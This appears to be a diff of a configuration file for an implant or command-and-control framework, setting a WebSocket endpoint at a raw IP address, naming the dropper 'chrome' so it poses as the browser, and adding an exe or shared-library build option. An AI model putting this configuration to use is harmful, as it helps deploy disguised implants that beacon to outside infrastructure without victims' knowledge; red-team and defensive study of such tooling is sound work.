@@ -160,8 +160,13 @@ WSEndpoint="wss://167.99.88.24:8082/stream"
 
 
 #----------- :: Implant Operating Context :: ---#
-# Implant Exe name
+# Implant bin/lib name
 DropperName="chrome"
+
+# Implant build type: a library or binary`
+# options : exe, c-shared, default
+#DropperBuildType="c-shared"
+DropperBuildType="exe"
 
 # Supported OS:
 #  darwin
